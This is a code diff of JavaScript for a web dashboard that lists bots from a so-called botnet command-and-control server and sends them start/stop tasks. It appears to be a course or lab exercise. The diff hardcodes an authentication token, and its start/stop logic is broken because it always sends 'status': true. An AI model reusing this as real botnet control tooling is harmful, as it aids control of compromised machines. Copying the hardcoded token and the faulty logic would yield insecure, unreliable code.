@@ -38,7 +38,6 @@ var cncServerRequest = function() {
 
 	// TODO encoding auf UTF-8
     xhr.open("GET", cncServer, true);
-    //xhr.setRequestHeader('Token', '031b46cd62bda614fffd542e20346821');
     xhr.send();
 
 	// error event handler
@@ -63,7 +62,7 @@ var cncServerRequest = function() {
         }
 
         sortBotnetData();
-		    updateStatusTable();
+        updateStatusTable();
         console.log("cnc server bot list reloaded");
     };
 };
@@ -96,9 +95,9 @@ function updateStatusTable() {
 	// fill table with new table rows
     for (var i = 0; i < botnetData.length; i++) {
         row = statusTable.insertRow(i);
-        row.innerHTML = "<td>" + botnetData[i].id + "</td><td>" + botnetData[i].ip + "</td><td>" + botnetData[i].workload + "</td>";
+        row.innerHTML = "<td>" + botnetData[i].id + "</td><td>" + botnetData[i].ip + "</td><td>" + botnetData[i].workload + "</td><td>" + botnetData[i].task + "</td>";
 
-        if(botnetData[i].task === 0) {
+        if(botnetData[i].workload === 0) {
 			// if inactive, button says start
 			row.innerHTML += "<td><button type=\"button\" onclick=\"statusButtonClicked(this.id)\" id=\"statusTask_" + botnetData[i].id + "\">Start</button></td>";
 		} else {
@@ -133,14 +132,24 @@ var statusTaskOperation = function(taskID, action) {
 	var xhr = new XMLHttpRequest();
 
     xhr.open("POST", cncServer);
-    //xhr.setRequestHeader("AlouScha", ""); TODO ----> ref: 07-Web API.md
-    //xhr.setRequestHeader("Authorization", "Token token=..."); ???
-    // Problem: 400 Bad Request
+    xhr.responseType = "json";
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    
+    xhr.setRequestHeader("Token", "031b46cd62bda614fffd542e20346821");
+
+	if(action === "stop") {
+		status = false;
+	}
+	else if(action === "start") {
+		status = true;
+	}
 
     var task = {
     	"id": taskID,
-    	"action": action
+    	"status": true
     };
+
+console.log(task);
 
     xhr.send(JSON.stringify(task));
 }
